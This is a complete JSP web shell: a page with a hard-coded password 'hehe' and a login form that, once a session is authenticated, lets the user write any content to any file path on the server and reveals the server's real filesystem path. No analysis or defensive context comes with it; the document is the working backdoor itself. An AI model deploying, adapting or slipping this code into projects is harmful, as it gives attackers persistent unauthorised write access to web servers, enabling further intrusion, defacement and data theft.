<%@page contentType="text/html; charset=GBK" import="java.io.*;"%>
<%!private String password="hehe";//??????%>
<html>
<head>
<title>hahahaha</title>
</head>
<body bgcolor="#ffffff">
<%
String act="";
String path=request.getParameter("path");
String content=request.getParameter("content");
String url=request.getRequestURI();
String url2=request.getRealPath(request.getServletPath());
try
{act=request.getParameter("act").toString();}
catch(Exception e){}
if(request.getSession().getAttribute("hehe")!=null)
{
if(request.getSession().getAttribute("hehe").toString().equals("hehe"))
{
if (path!=null && !path.equals("") && content!=null && !content.equals(""))
{
   try{
     File newfile=new File(path);
     PrintWriter writer=new PrintWriter(newfile);
     writer.println(content);
     writer.close();
     if (newfile.exists() && newfile.length()>0)
     {
       out.println("<font size=3 color=red>save ok!</font>");
     }else{
       out.println("<font size=3 color=red>save erry!</font>");
     }
   }catch(Exception e)
   {
     e.printStackTrace();
   }
}
out.println("<form action="+url+" method=post>");
out.println("<font size=3><br></font><input type=text size=54 name='path'><br>");
out.println("<font size=3 color=red>"+url2+"</font><br>");
out.println("<textarea name='content' rows=15 cols=50></textarea><br>");
out.println("<input type='submit' value='save!'>");
out.println("</form>");
}
}else{
out.println("<div align='center'><form action='?act=login' method='post'>");
out.println("<input type='password' name='pass'/>");
out.println("<input type='submit' name='update' class='unnamed1' value='Login' />");
out.println("</form></div>");
}if(act.equals("login"))
{
    String pass=request.getParameter("pass");
    if(pass.equals(password))
    {
     session.setAttribute("hehe","hehe");
     String uri=request.getRequestURI();   
     uri=uri.substring(uri.lastIndexOf("/")+1); 
    response.sendRedirect(uri);
    }else
    {
out.println("Error");
out.println("<a href='javascript:history.go(-1)'><font color='red'>go back</font></a></div><br>");
    }
    }
%>
</body>
</html>
